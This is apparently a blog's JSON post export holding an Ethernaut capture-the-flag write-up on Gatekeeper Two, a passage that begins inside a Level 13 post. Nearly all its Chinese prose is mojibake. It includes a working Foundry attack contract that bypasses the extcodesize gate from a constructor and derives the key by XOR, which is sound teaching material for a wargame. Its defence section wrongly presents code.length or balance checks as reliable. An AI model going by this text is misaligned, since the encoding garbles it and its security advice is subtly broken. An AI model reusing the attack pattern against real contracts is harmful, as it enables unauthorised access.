<code>gas</code> æŠ€å·§ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨æ•°å­—ç­¾åã€Merkleæ ‘æˆ–é¢„è¨€æœºç­‰æ›´å¼ºå¤§çš„éªŒè¯æœºåˆ¶ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>Foundry <code>try/catch</code></strong>: ç”¨äºåœ¨æµ‹è¯•ä¸­æ•è·å’Œå¤„ç†é¢„æœŸçš„ <code>revert</code>ï¼Œéå¸¸é€‚åˆæš´åŠ›ç ´è§£ <code>gas</code> ç­‰åœºæ™¯ã€‚</li>\n<li><strong>ä½æ“ä½œ (<code>|</code>, <code>&amp;</code>)</strong>: åœ¨æ„é€  <code>_gateKey</code> æ—¶ç”¨äºç²¾ç¡®æ§åˆ¶å­—èŠ‚å†…å®¹ã€‚</li>\n<li><strong>ç±»å‹è½¬æ¢</strong>: æ·±å…¥ç†è§£Solidityä¸­ä¸åŒæ•´æ•°ç±»å‹ï¼ˆ<code>uint16</code>, <code>uint32</code>, <code>uint64</code>ï¼‰å’Œå­—èŠ‚ç±»å‹ï¼ˆ<code>bytes8</code>ï¼‰ä¹‹é—´çš„è½¬æ¢è§„åˆ™è‡³å…³é‡è¦ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>tx.origin</code> vs <code>msg.sender</code> çš„åŒºåˆ«æ˜¯è®¸å¤šåˆçº¦æ”»å‡»çš„åŸºç¡€ã€‚</li>\n<li><code>gasleft()</code> çš„å€¼æ˜¯åŠ¨æ€çš„ï¼Œä¾èµ–å®ƒè¿›è¡ŒéªŒè¯æ˜¯è„†å¼±çš„ã€‚</li>\n<li>Solidityä¸­çš„ç±»å‹è½¬æ¢éµå¾ªä¸¥æ ¼çš„è§„åˆ™ï¼Œä¸æ­£ç¡®çš„è½¬æ¢æˆ–æˆªæ–­æ˜¯å¸¸è§çš„æ¼æ´æ¥æºã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡ä¸­é—´åˆçº¦ç»•è¿‡ <code>tx.origin</code> æ£€æŸ¥ã€‚</li>\n<li>é€šè¿‡æš´åŠ›ç ´è§£æ‰¾åˆ°æ»¡è¶³ <code>gasleft()</code> æ¨¡è¿ç®—çš„ <code>gas</code> å€¼ã€‚</li>\n<li>é€šè¿‡é€†å‘å·¥ç¨‹ç±»å‹è½¬æ¢å’Œä½æ“ä½œçš„ <code>require</code> æ¡ä»¶æ¥æ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„è¾“å…¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä¸è¦å°† <code>gas</code> æ¶ˆè€—ä½œä¸ºå®‰å…¨æœºåˆ¶ã€‚</li>\n<li>ä¿æŒéªŒè¯é€»è¾‘çš„ç®€å•å’Œç›´æ¥ã€‚</li>\n<li>ä½¿ç”¨ç»è¿‡éªŒè¯çš„ã€æ›´å¼ºå¤§çš„èº«ä»½éªŒè¯æ¨¡å¼ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/types.html#conversions\">Solidity ç±»å‹è½¬æ¢</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/phishing-with-tx-origin/\">tx.origin vs msg.sender</a></li>\n</ul>\n"},{"title":"Etnhernault Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize","date":"2025-01-25T08:15:00.000Z","updated":"2025-01-25T08:15:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨åˆçº¦åœ¨ `constructor` é˜¶æ®µ `extcodesize` ä¸º0çš„ç‰¹æ€§ï¼Œå·§å¦™ç»•è¿‡å¤æ‚çš„è®¿é—®æ§åˆ¶ã€‚æ·±å…¥ç†è§£ `caller()` å’Œ `extcodesize` çš„å·¥ä½œåŸç†ï¼ŒæŒæ¡ Gatekeeper Two å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 14 - Gatekeeper Two](https://ethernaut.openzeppelin.com/level/14)  \n> **æ”»å‡»ç±»å‹**: `extcodesize` / `constructor` äº¤äº’  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡é€šè¿‡ä¸‰ä¸ª `modifier` çš„æ£€æŸ¥ï¼Œæˆä¸º `entrant`ã€‚\n\n![Gatekeeper Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ `enter(bytes8 _gateKey)` å‡½æ•°ï¼Œå¹¶ç»•è¿‡å®ƒçš„ä¸‰ä¸ª `modifier`ã€‚\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\nä¸ç¬¬13å…³å®Œå…¨ç›¸åŒã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ `enter` å‡½æ•°ï¼Œä»¥ç¡®ä¿ `msg.sender` æ˜¯åˆçº¦åœ°å€ï¼Œè€Œ `tx.origin` æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ã€‚\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  uint x;\n  assembly {\n    x := extcodesize(caller())\n  }\n  require(x == 0);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` ä½¿ç”¨å†…è”æ±‡ç¼–æ£€æŸ¥ `caller()` çš„ `extcodesize` æ˜¯å¦ä¸º0ã€‚`caller()` è¿”å›çš„æ˜¯ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ï¼ˆåœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œå°±æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ï¼‰ï¼Œè€Œ `extcodesize` è¿”å›è¯¥åœ°å€å…³è”çš„ä»£ç å¤§å°ã€‚\n\n-   å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå·²ç»éƒ¨ç½²çš„åˆçº¦ï¼Œ`extcodesize` ä¼šè¿”å›ä¸€ä¸ªå¤§äº0çš„å€¼ã€‚\n-   å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰ï¼Œ`extcodesize` è¿”å›0ã€‚\n\nè¿™ä¸ `gateOne` çš„è¦æ±‚ï¼ˆ`msg.sender` å¿…é¡»æ˜¯åˆçº¦ï¼‰äº§ç”Ÿäº†çŸ›ç›¾ã€‚æˆ‘ä»¬å¦‚ä½•æ‰èƒ½è®©ä¸€ä¸ªåˆçº¦åœ°å€çš„ `extcodesize` ä¸º0å‘¢ï¼Ÿ\n\nç­”æ¡ˆåœ¨äºåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ï¼š**å½“ä¸€ä¸ªåˆçº¦çš„ `constructor` æ­£åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥åˆçº¦çš„ä»£ç å°šæœªå®Œå…¨éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œå› æ­¤æ­¤æ—¶å¯¹è¯¥åˆçº¦åœ°å€è°ƒç”¨ `extcodesize` ä¼šè¿”å›0ã€‚**\n\nå› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ”»å‡»åˆçº¦çš„ `constructor` å†…éƒ¨è°ƒç”¨ç›®æ ‡åˆçº¦çš„ `enter` å‡½æ•°ã€‚\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` åŒ…å«ä¸€ä¸ªæœ‰è¶£çš„å¼‚æˆ–ï¼ˆXORï¼‰é€»è¾‘ã€‚è®©æˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹ï¼š\n\n`A ^ B = C`\n\nå…¶ä¸­ï¼š\n-   `A` æ˜¯ `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n-   `B` æ˜¯ `uint64(_gateKey)`\n-   `C` æ˜¯ `type(uint64).max` (å³ `0xFFFFFFFFFFFFFFFF`)\n\næ ¹æ®å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œå¦‚æœ `A ^ B = C`ï¼Œé‚£ä¹ˆ `A ^ C = B`ã€‚\n\nå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®— `A ^ C` æ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ `_gateKey`ã€‚\n\n`_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max`\n\nç”±äº `msg.sender` æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ”»å‡»åˆçº¦çš„ `constructor` ä¸­è®¡ç®—å‡ºè¿™ä¸ªå€¼ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næˆ‘ä»¬çš„æ”»å‡»åˆçº¦éå¸¸ç®€æ´ã€‚å®ƒåœ¨ `constructor` ä¸­å®Œæˆæ‰€æœ‰çš„å·¥ä½œï¼šè®¡ç®— `gateKey` å¹¶ç«‹å³è°ƒç”¨ç›®æ ‡å®ä¾‹çš„ `enter` å‡½æ•°ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/14_GatekeeperTwo.sol\";\n\n// Foundry æµ‹è¯•åˆçº¦\ncontract GatekeeperTwoTest is Test {\n    GatekeeperTwo instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperTwo();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n        // éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶ï¼Œå…¶æ„é€ å‡½æ•°ä¼šè‡ªåŠ¨æ‰§è¡Œæ”»å‡»\n        attacker = new Attack(address(instance));\n        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\n// æ”»å‡»åˆçº¦\ncontract Attack {\n    constructor(address _instanceAddress) {\n        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);\n\n        // è®¡ç®— gateKey\n        // A ^ C = B\n        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));\n        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF\n        bytes8 gateKey = bytes8(keyPart ^ max_uint);\n\n        // åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ enter å‡½æ•°\n        instance.enter(gateKey);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **åˆ›å»ºæ”»å‡»åˆçº¦**: æ”»å‡»é€»è¾‘å®Œå…¨åŒ…å«åœ¨ `constructor` ä¸­ã€‚\n2.  **åœ¨ `constructor` ä¸­è°ƒç”¨**: è¿™æ˜¯å…³é”®ã€‚åœ¨ `constructor` ä¸­è°ƒç”¨ `enter` å‡½æ•°ï¼Œæ­¤æ—¶ `extcodesize(address(this))` ä¸º0ï¼Œç»•è¿‡äº† `gateTwo`ã€‚\n3.  **è®¡ç®— `_gateKey`**: åœ¨ `constructor` ä¸­ï¼Œä½¿ç”¨ `address(this)` ä½œä¸º `msg.sender` æ¥è®¡ç®— `keccak256` å“ˆå¸Œï¼Œå¹¶é€šè¿‡XORè¿ç®—å¾—åˆ°æ­£ç¡®çš„ `_gateKey`ï¼Œä»è€Œç»•è¿‡ `gateThree`ã€‚\n4.  **éƒ¨ç½²å³æ”»å‡»**: éƒ¨ç½²æ”»å‡»åˆçº¦çš„äº¤æ˜“ä¸€æ—¦æˆåŠŸï¼Œæ”»å‡»å°±å®Œæˆäº†ï¼Œ`entrant` å°†è¢«è®¾ç½®ä¸ºæˆ‘ä»¬çš„EOAåœ°å€ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **é¿å…ä½¿ç”¨ `extcodesize` è¿›è¡Œåˆçº¦æ£€æŸ¥**: æ­£å¦‚æœ¬ä¾‹æ‰€ç¤ºï¼Œ`extcodesize` å¯ä»¥è¢« `constructor` è°ƒç”¨ç»•è¿‡ã€‚ä¸€ä¸ªæ›´å¯é çš„æ£€æŸ¥æ–¹æ³•æ˜¯åˆ¤æ–­ `address.balance > 0` æˆ–è€… `address.code.length > 0`ï¼ˆåœ¨Solidity 0.8.10åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼‰ã€‚\n2.  **å¯¹ `caller` çš„é¢å¤–æ£€æŸ¥**: å¦‚æœç¡®å®éœ€è¦é˜»æ­¢åˆçº¦è°ƒç”¨ï¼Œå¯ä»¥ç»“åˆ `tx.origin == msg.sender` çš„æ£€æŸ¥ï¼Œä½†è¿™ä¼šé™åˆ¶åˆçº¦çš„å¯ç»„åˆæ€§ã€‚\n3.  **ç®€åŒ–å¯†é’¥éªŒè¯**: å¤æ‚çš„å¯†é’¥æ´¾ç”Ÿé€»è¾‘ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„XORï¼‰å¯èƒ½çœ‹èµ·æ¥å®‰å…¨ï¼Œä½†å¦‚æœæ‰€æœ‰è¾“å…¥éƒ½æ¥è‡ªé“¾ä¸Šï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥é€†å‘å·¥ç¨‹å‡ºæ­£ç¡®çš„å¯†é’¥ã€‚åº”ä½¿ç”¨é“¾ä¸‹ç­¾åç­‰æ›´å®‰å…¨çš„æœºåˆ¶ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **`constructor`**: åˆçº¦çš„æ„é€ å‡½æ•°ï¼Œä»…åœ¨åˆçº¦éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚ç†è§£å…¶åœ¨ç”Ÿå‘½å‘¨æœŸä¸­çš„ç‰¹æ®Šæ€§ï¼ˆå¦‚ `extcodesize` ä¸º0ï¼‰æ˜¯è§£å†³æ­¤ç±»æŒ‘æˆ˜çš„å…³é”®ã€‚\n-   **`extcodesize`**: ä¸€ä¸ªEVMæ“ä½œç ï¼Œç”¨äºè·å–åœ°å€çš„ä»£ç å¤§å°ã€‚æ˜¯åŒºåˆ†EOAå’Œåˆçº¦çš„å¸¸ç”¨æ–¹æ³•ï¼Œä½†æœ‰å…¶å±€é™æ€§ã€‚\n-   **å¼‚æˆ–è¿ç®— (`^`)**: ä¸€ç§ä½è¿ç®—ç¬¦ï¼Œåœ¨å¯†ç å­¦å’Œå“ˆå¸Œæ“ä½œä¸­å¾ˆå¸¸è§ã€‚ç†è§£å…¶ `A ^ B = C` <=> `A ^ C = B` çš„æ€§è´¨å¯¹äºè§£å†³ `gateThree` è‡³å…³é‡è¦ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åˆçº¦åœ¨ `constructor` æ‰§è¡ŒæœŸé—´çš„ä»£ç å¤§å°ï¼ˆ`extcodesize`ï¼‰ä¸º0ã€‚\n-   `caller()` å’Œ `address(this)` åœ¨ç‰¹å®šä¸Šä¸‹æ–‡ä¸­çš„åŒºåˆ«å’Œè”ç³»ã€‚\n-   å¼‚æˆ–ï¼ˆXORï¼‰è¿ç®—çš„å¯é€†æ€§æ˜¯è§£å†³å¯†ç å­¦ç›¸å…³è°œé¢˜çš„å¸¸ç”¨å·¥å…·ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ©ç”¨ `constructor` çš„ç‰¹æ€§ç»•è¿‡ `extcodesize` æ£€æŸ¥ã€‚\n-   åœ¨ `constructor` ä¸­å®Œæˆæ‰€æœ‰æ”»å‡»æ­¥éª¤ï¼Œå®ç°â€œéƒ¨ç½²å³æ”»å‡»â€ã€‚\n-   é€†å‘å·¥ç¨‹XORé€»è¾‘ä»¥è®¡ç®—å‡ºæ‰€éœ€çš„å¯†é’¥ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä¸è¦ä¾èµ– `extcodesize` æ¥åˆ¤æ–­ä¸€ä¸ªåœ°å€æ˜¯å¦ä¸ºåˆçº¦ã€‚\n-   è®¾è®¡æ›´ç®€å•ã€æ›´ç›´æ¥çš„éªŒè¯æœºåˆ¶ï¼Œé¿å…æ¨¡ç³Šçš„é“¾ä¸Šå¯†é’¥æ´¾ç”Ÿã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: `extcodesize` Caveats](https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction)\n-   [Understanding the EVM: Opcodes](https://www.evm.codes/)","source":"_posts/ethernaut-level-14-gatekeeper-two.md","raw":"---\ntitle: 'Etnhernault Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize'\ndate: 2025-01-25 16:15:00\nupdated: 2025-01-25 16:15:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - extcodesize\n  - constructor\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨åˆçº¦åœ¨ `constructor` é˜¶æ®µ `extcodesize` ä¸º0çš„ç‰¹æ€§ï¼Œå·§å¦™ç»•è¿‡å¤æ‚çš„è®¿é—®æ§åˆ¶ã€‚æ·±å…¥ç†è§£ `caller()` å’Œ `extcodesize` çš„å·¥ä½œåŸç†ï¼ŒæŒæ¡ Gatekeeper Two å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 14: Gatekeeper Two - åˆçº¦åˆ›å»ºæ—¶çš„ extcodesize\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 14 - Gatekeeper Two](https://ethernaut.openzeppelin.com/level/14)  \n> **æ”»å‡»ç±»å‹**: `extcodesize` / `constructor` äº¤äº’  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡é€šè¿‡ä¸‰ä¸ª `modifier` çš„æ£€æŸ¥ï¼Œæˆä¸º `entrant`ã€‚\n\n![Gatekeeper Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¦é€šè¿‡æ­¤å…³å¡ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ `enter(bytes8 _gateKey)` å‡½æ•°ï¼Œå¹¶ç»•è¿‡å®ƒçš„ä¸‰ä¸ª `modifier`ã€‚\n\n### Modifier 1: `gateOne`\n\n```solidity\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n```\n\nä¸ç¬¬13å…³å®Œå…¨ç›¸åŒã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªä¸­é—´åˆçº¦æ¥è°ƒç”¨ `enter` å‡½æ•°ï¼Œä»¥ç¡®ä¿ `msg.sender` æ˜¯åˆçº¦åœ°å€ï¼Œè€Œ `tx.origin` æ˜¯æˆ‘ä»¬çš„EOAåœ°å€ã€‚\n\n### Modifier 2: `gateTwo`\n\n```solidity\nmodifier gateTwo() {\n  uint x;\n  assembly {\n    x := extcodesize(caller())\n  }\n  require(x == 0);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` ä½¿ç”¨å†…è”æ±‡ç¼–æ£€æŸ¥ `caller()` çš„ `extcodesize` æ˜¯å¦ä¸º0ã€‚`caller()` è¿”å›çš„æ˜¯ç›´æ¥è°ƒç”¨è€…çš„åœ°å€ï¼ˆåœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œå°±æ˜¯æ”»å‡»åˆçº¦çš„åœ°å€ï¼‰ï¼Œè€Œ `extcodesize` è¿”å›è¯¥åœ°å€å…³è”çš„ä»£ç å¤§å°ã€‚\n\n-   å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå·²ç»éƒ¨ç½²çš„åˆçº¦ï¼Œ`extcodesize` ä¼šè¿”å›ä¸€ä¸ªå¤§äº0çš„å€¼ã€‚\n-   å¦‚æœè°ƒç”¨è€…æ˜¯ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰ï¼Œ`extcodesize` è¿”å›0ã€‚\n\nè¿™ä¸ `gateOne` çš„è¦æ±‚ï¼ˆ`msg.sender` å¿…é¡»æ˜¯åˆçº¦ï¼‰äº§ç”Ÿäº†çŸ›ç›¾ã€‚æˆ‘ä»¬å¦‚ä½•æ‰èƒ½è®©ä¸€ä¸ªåˆçº¦åœ°å€çš„ `extcodesize` ä¸º0å‘¢ï¼Ÿ\n\nç­”æ¡ˆåœ¨äºåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ï¼š**å½“ä¸€ä¸ªåˆçº¦çš„ `constructor` æ­£åœ¨æ‰§è¡Œæ—¶ï¼Œè¯¥åˆçº¦çš„ä»£ç å°šæœªå®Œå…¨éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œå› æ­¤æ­¤æ—¶å¯¹è¯¥åˆçº¦åœ°å€è°ƒç”¨ `extcodesize` ä¼šè¿”å›0ã€‚**\n\nå› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ”»å‡»åˆçº¦çš„ `constructor` å†…éƒ¨è°ƒç”¨ç›®æ ‡åˆçº¦çš„ `enter` å‡½æ•°ã€‚\n\n### Modifier 3: `gateThree`\n\n```solidity\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n  _;\n}\n```\n\nè¿™ä¸ª `modifier` åŒ…å«ä¸€ä¸ªæœ‰è¶£çš„å¼‚æˆ–ï¼ˆXORï¼‰é€»è¾‘ã€‚è®©æˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹ï¼š\n\n`A ^ B = C`\n\nå…¶ä¸­ï¼š\n-   `A` æ˜¯ `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`\n-   `B` æ˜¯ `uint64(_gateKey)`\n-   `C` æ˜¯ `type(uint64).max` (å³ `0xFFFFFFFFFFFFFFFF`)\n\næ ¹æ®å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œå¦‚æœ `A ^ B = C`ï¼Œé‚£ä¹ˆ `A ^ C = B`ã€‚\n\nå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¡ç®— `A ^ C` æ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ `_gateKey`ã€‚\n\n`_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max`\n\nç”±äº `msg.sender` æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ”»å‡»åˆçº¦çš„ `constructor` ä¸­è®¡ç®—å‡ºè¿™ä¸ªå€¼ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næˆ‘ä»¬çš„æ”»å‡»åˆçº¦éå¸¸ç®€æ´ã€‚å®ƒåœ¨ `constructor` ä¸­å®Œæˆæ‰€æœ‰çš„å·¥ä½œï¼šè®¡ç®— `gateKey` å¹¶ç«‹å³è°ƒç”¨ç›®æ ‡å®ä¾‹çš„ `enter` å‡½æ•°ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/14_GatekeeperTwo.sol\";\n\n// Foundry æµ‹è¯•åˆçº¦\ncontract GatekeeperTwoTest is Test {\n    GatekeeperTwo instance;\n    Attack attacker;\n    address player1;\n\n    function setUp() public {\n        player1 = vm.addr(1);\n        instance = new GatekeeperTwo();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player1, player1);\n        // éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶ï¼Œå…¶æ„é€ å‡½æ•°ä¼šè‡ªåŠ¨æ‰§è¡Œæ”»å‡»\n        attacker = new Attack(address(instance));\n        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ\n        assertEq(instance.entrant(), player1);\n        vm.stopPrank();\n    }\n}\n\n// æ”»å‡»åˆçº¦\ncontract Attack {\n    constructor(address _instanceAddress) {\n        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);\n\n        // è®¡ç®— gateKey\n        // A ^ C = B\n        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));\n        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF\n        bytes8 gateKey = bytes8(keyPart ^ max_uint);\n\n        // åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ enter å‡½æ•°\n        instance.enter(gateKey);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **åˆ›å»ºæ”»å‡»åˆçº¦**: æ”»å‡»é€»è¾‘å®Œå…¨åŒ…å«åœ¨ `constructor` ä¸­ã€‚\n2.  **åœ¨ `constructor` ä¸­è°ƒç”¨**: è¿™æ˜¯å…³é”®ã€‚åœ¨ `constructor` ä¸­è°ƒç”¨ `enter` å‡½æ•°ï¼Œæ­¤æ—¶ `extcodesize(address(this))` ä¸º0ï¼Œç»•è¿‡äº† `gateTwo`ã€‚\n3.  **è®¡ç®— `_gateKey`**: åœ¨ `constructor` ä¸­ï¼Œä½¿ç”¨ `address(this)` ä½œä¸º `msg.sender` æ¥è®¡ç®— `keccak256` å“ˆå¸Œï¼Œå¹¶é€šè¿‡XORè¿ç®—å¾—åˆ°æ­£ç¡®çš„ `_gateKey`ï¼Œä»è€Œç»•è¿‡ `gateThree`ã€‚\n4.  **éƒ¨ç½²å³æ”»å‡»**: éƒ¨ç½²æ”»å‡»åˆçº¦çš„äº¤æ˜“ä¸€æ—¦æˆåŠŸï¼Œæ”»å‡»å°±å®Œæˆäº†ï¼Œ`entrant` å°†è¢«è®¾ç½®ä¸ºæˆ‘ä»¬çš„EOAåœ°å€ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **é¿å…ä½¿ç”¨ `extcodesize` è¿›è¡Œåˆçº¦æ£€æŸ¥**: æ­£å¦‚æœ¬ä¾‹æ‰€ç¤ºï¼Œ`extcodesize` å¯ä»¥è¢« `constructor` è°ƒç”¨ç»•è¿‡ã€‚ä¸€ä¸ªæ›´å¯é çš„æ£€æŸ¥æ–¹æ³•æ˜¯åˆ¤æ–­ `address.balance > 0` æˆ–è€… `address.code.length > 0`ï¼ˆåœ¨Solidity 0.8.10åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼‰ã€‚\n2.  **å¯¹ `caller` çš„é¢å¤–æ£€æŸ¥**: å¦‚æœç¡®å®éœ€è¦é˜»æ­¢åˆçº¦è°ƒç”¨ï¼Œå¯ä»¥ç»“åˆ `tx.origin == msg.sender` çš„æ£€æŸ¥ï¼Œä½†è¿™ä¼šé™åˆ¶åˆçº¦çš„å¯ç»„åˆæ€§ã€‚\n3.  **ç®€åŒ–å¯†é’¥éªŒè¯**: 